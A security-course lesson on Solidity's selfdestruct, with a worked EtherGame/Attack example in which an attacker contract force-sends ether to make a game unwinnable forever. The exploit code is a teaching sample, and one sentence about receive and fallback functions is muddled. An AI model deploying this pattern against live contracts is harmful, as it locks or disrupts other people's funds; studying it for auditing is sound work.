---
title: Self-destruct
---

_follow along with the video_

---

In the course of analyzing Solidity - the creation language for Ethereum smart contracts - the `selfdestruct` term is a very crucial concept, initially taught in the Foundry Fill course but might be quickly glossed over. As Ethereum enthusiasts, understanding these key terminologies and functionalities allows us to maximize the possibilities Ethereum offers. The `selfdestruct` is a keyword in Solidity that removes or deletes a contract. But there's something extra special about it.

## The Unique Characteristic of Selfdestruct

<img src="/security-section-1/14-self-destruct/destruct1.png" style="width: 100%; height: auto;" alt="block fee">

Why `selfdestruct` stands out lies in its exceptional behavior once a contract gets destroyed. Any Ethereum (or ETH) residing within the deleted contract gets automatically ‘pushed’ or ‘forced’ into any address that you specify.

This behavior is not present if a contract doesn't incorporate a Receive or a Fallback function. Only through the use of `selfdestruct` can you be permitted to push any Ethereum into such a contract.

So if ever you’re hunting for an exploit, or you have identified an attack where you need to force ETH into a contract, `selfdestruct` will be your instrument of choice.

## `selfdestruct` in Action

To get a clear understanding, let’s put these into practice. Starting with a code base from [Solidity by example](https://solidity-by-example.org/hacks/self-destruct/) - and then carrying it into Remix, we will be able to observe this concept directly in action.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

```

When we deploy these contracts and interact with the functions, we realize that we are able to `deposit` Ethereum to the `EtherGame` contract but there is a limit set to prevent the game from going over a set target. Without a fallback or receive function, we can't send ETH directly into the contract.

> A wise choice would be to force ETH into a contract via `selfdestruct` and hence blocking the game mechanics, making the game unplayable forever.

The `Selfdestruct` keyword will forcefully push value into another smart contract, whether the receiving contract is prepared to receive funds or not.

## Conclusion

The `selfdestruct` function is a powerful tool in Ethereum's Solidity language. Use it wisely and with caution. It provides not only a means to delete a contract but also the ability to forcefully push any amount of Ethereum into any other contract address. It also serves as a useful instrument for exploiting smart contracts by forcing Ethereum into places where they don't typically go.
